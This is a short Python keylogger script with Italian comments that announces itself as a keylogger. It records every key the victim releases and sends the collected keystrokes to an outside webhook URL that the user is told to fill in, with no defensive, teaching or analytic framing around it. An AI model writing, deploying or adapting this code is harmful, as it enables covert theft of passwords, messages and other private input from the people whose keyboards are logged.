
import keyboard
import time
import requests
import threading

print("keylogger avviato con successo!")

webhook = "WEBHOOK_URL" #METTI IL WEBHOOK URL NEGLI APICI

keylogs = []

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str = "\n".join(keylogs)

        payload = {
            "content": keylogs_str
        }

        requests.post(webhook, data=payload)

        keylogs = []

threading.Timer(10, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs
    keylogs.append(event.name)

keyboard.on_release(callback=capture_keystrokes)

while True:
    time.sleep(1)



